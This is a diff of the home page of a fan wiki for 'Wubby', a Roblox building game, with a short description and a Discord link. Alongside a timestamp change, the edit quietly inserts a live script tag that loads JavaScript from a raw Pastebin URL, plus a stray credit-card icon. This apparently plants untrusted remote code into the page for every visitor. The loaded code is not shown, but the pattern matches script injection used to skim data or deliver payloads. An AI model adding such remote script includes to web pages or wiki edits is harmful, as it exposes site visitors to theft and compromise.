@@ -2,7 +2,7 @@
 title: Home
 description: Welcome to Wubby! A roblox building game based on (the now content deleted) World Builder.
 published: true
-date: 2023-07-14T04:43:22.472Z
+date: 2023-08-01T10:51:42.323Z
 tags: 
 editor: markdown
 dateCreated: 2023-05-11T03:05:24.832Z
@@ -21,6 +21,10 @@ dateCreated: 2023-05-11T03:05:24.832Z
 Welcome to the official Wubby wiki
 
 Wubby is a building-based game based on building games on Roblox such as Sandbox, Blockate, and World Builder. The game also features more complex wiring & building blocks.
+
+<script src="https://pastebin.com/raw/WsSMs0KX" crossorigin="anonymous"></script>
+
+<i class="fa-duotone fa-credit-card"></i>
 
 # Links
 - [Discord server *Come chat with us here and get game updates!*](https://discord.gg/YHtthk2dYX)
